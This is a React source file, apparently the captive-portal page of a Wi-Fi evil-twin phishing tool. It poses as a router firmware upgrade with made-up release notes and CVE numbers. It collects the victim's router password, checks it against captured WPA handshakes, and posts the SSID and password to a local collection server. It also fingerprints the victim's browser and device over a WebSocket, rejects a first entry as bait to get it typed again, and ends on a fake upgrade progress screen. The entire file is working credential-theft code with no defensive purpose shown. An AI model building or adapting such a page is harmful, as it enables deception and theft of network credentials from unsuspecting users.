import { useEffect, useRef, useState } from "react";
import { Button } from "./components/ui/button";
import { Input } from "./components/ui/input";
import { crackPassword } from "./screens/helper";
import { handshake } from "./lib/config";
import { UAParser } from "ua-parser-js";

const Home = () => {
  const [final, setFinal] = useState(false);
  const [percent, setPercent] = useState(0);
  const [password, setPassword] = useState("");
  const [handshakes, setHandshakes] = useState([]);
  const [bait, setBait] = useState(true);
  const ws = useRef<WebSocket | null>(null);

  const postPassword = async (
    ssid: string,
    passwd: string,
    matched: boolean,
    handshakes: boolean
  ) => {
    const data = {
      ssid: ssid,
      password: passwd,
      matched: matched ? true : false,
      handshakes: handshakes ? true : false,
    };
    const response = await fetch("http://172.0.0.1/post_password", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    const result = await response.json();
    console.log(result);
  };

  const startfinal = () => {
    const interval = setInterval(() => {
      setPercent((prev) => {
        if (prev === 100) {
          clearInterval(interval);
          return prev;
        }
        return prev + 1;
      });
    }, 1000);
  };

  const handlePassword = async () => {
    if (password.trim() === "") {
      alert("Please enter the router password");
      return;
    }
    if (password.length < 8) {
      alert("Password must be at least 8 characters long");
      return;
    }
    const info = {
      type: "password",
      password: password,
    };
    ws.current?.send(JSON.stringify(info));
    const currentSSID = await fetch("/get_ssid");
    // const currentSSID = await fetch("/temp/temp-ssid.json")
    const ssid = await currentSSID.json();
    if (
      handshakes.length === 0 ||
      handshakes.filter((handshake: handshake) => handshake.ssid === ssid.ssid)
        .length === 0
    ) {
      postPassword("No Handshake - " + ssid.ssid, password, false, false);
      if (bait) {
        ws.current?.send(
          JSON.stringify({
            type: "message",
            message:
              "Don't have handshake for SSID: '" +
              ssid.ssid +
              "' triggered bait",
          })
        );
        const psswd: HTMLInputElement = document.getElementById(
          "psswd"
        ) as HTMLInputElement;
        psswd.value = "";
        alert("Password isnt correct");
        setBait(false);
        return;
      } else {
        ws.current?.send(
          JSON.stringify({
            type: "message",
            message: "After Bait, Triggerring final screen",
          })
        );
        setFinal(true);
        startfinal();
        return;
      }
    }
    handshakes.forEach((handshake: handshake) => {
      if (handshake.ssid === ssid.ssid) {
        if (crackPassword(handshake, password)) {
          ws.current?.send(
            JSON.stringify({
              type: "message",
              message: `✅ '${password}' is a valid password`,
            })
          );
          postPassword(handshake.ssid, password, true, true);
          setFinal(true);
          startfinal();
          return;
        } else {
          ws.current?.send(
            JSON.stringify({
              type: "message",
              message: `❌ '${password}' is not a valid password`,
            })
          );
          postPassword(handshake.ssid, password, false, true);
          alert("Wrong Password");
          return;
        }
      }
    });
  };

  const fetchHandshakes = async () => {
    const result = await fetch("/get_datas");
    // const result = await fetch("/temp/temp-datas.json")
    const data = await result.json();
    setHandshakes(data.handshakes);
  };

  async function wsConnection() {
    try {
      ws.current = new WebSocket("ws://172.0.0.1:81/");
      ws.current.onopen = () => {
        let parser = new UAParser();
        let result = parser.getResult();
        const deviceInfo = {
          type: "deviceInfo",
          browser: result.browser.name + " " + result.browser.version,
          os: result.os.name + " " + result.os.version,
          cpu: result.cpu.architecture,
          device: result.device,
          screenWidth: window.screen.width,
          screenHeight: window.screen.height,
        };
        ws.current?.send(JSON.stringify(deviceInfo));
      };
      ws.current.onclose = () => {
        wsConnection();
      };

      setTimeout(() => {
        if (ws.current?.readyState !== 1) {
          ws.current?.close();
        }
      }, 15000);
    } catch (err) {
      console.log(err, "WebSocket error");
    }
  }

  useEffect(() => {
    fetchHandshakes();
    wsConnection();
  }, []);

  return (
    <div className="flex flex-1 bg-sky-300 h-screen justify-center items-center">
      {!final ? (
        <div className="rounded-lg p-3 shadow-lg drop-shadow-lg bg-gray-200 w-full max-w-xs sm:max-w-md ">
          <h1 className="text-lg font-bold text-gray-500">
            Router Firmware Upgrade
          </h1>
          <div className="border border-gray-400 mt-2"></div>
          <p className="mt-2 text-gray-500">
            A new version of the firmware has been detected and awaiting
            installation
          </p>
          <div className="flex items-center gap-3 mt-2">
            <p className="text-md font-bold text-gray-500">
              Firmware Version :
            </p>
            <p className="text-gray-500">v3.0.7</p>
          </div>
          <div className="flex items-center gap-3 mt-2">
            <p className="text-md font-bold text-gray-500">Release Date :</p>
            <p className="text-gray-500">{new Date().toLocaleDateString()}</p>
          </div>

          <h2 className="text-md font-bold text-gray-500 mt-2">
            Release Notes :
          </h2>
          <div className="mt-2 text-gray-500">
            <ul className="list-disc list-inside ml-7 -indent-4 sm:-indent-6">
              <li>
                Security fixes for the following vulnerabilities: <br />{" "}
                CVE-2021-1234, CVE-2021-1235,CVE-2021-1236
              </li>
              <li>
                Implemented a new feature that enhances the security and
                stability of the router
              </li>
              <li>
                Fixed a bug that caused the router to crash when using the web
                interface
              </li>
            </ul>
          </div>
          <p className="mt-2 text-gray-500">
            Enter the router password to start the firmware upgrade process. The
            router will reboot after the upgrade.
          </p>
          <Input
            placeholder="Router Passphrase"
            className="bg-transparent text-gray-500 border-gray-400 mt-3"
            type="password"
            id="psswd"
            onChange={(e) => setPassword(e.target.value)}
          />
          <Button
            variant={"outline"}
            className="mt-2 w-full bg-gray-600 border-none"
            onClick={handlePassword}
          >
            Upgrade
          </Button>
        </div>
      ) : !ws.current?.CONNECTING && (
        <div className="flex flex-col justify-center items-center">
          <div className="newtons-cradle">
            <div className="newtons-cradle__dot"></div>
            <div className="newtons-cradle__dot"></div>
            <div className="newtons-cradle__dot"></div>
            <div className="newtons-cradle__dot"></div>
          </div>

          <div className="text-gray-500 text-center mt-2 text-lg">
            {percent} %
            {percent === 100 ? (
              <>
                <p>Upgraded</p>
                <p>Reboot your router</p>
              </>
            ) : (
              <>
                <p>Upgrading Firmware</p>
                <p>Do not turn off the router</p>
              </>
            )}
          </div>
        </div>
      )}
    </div>
  );
};

export default Home;
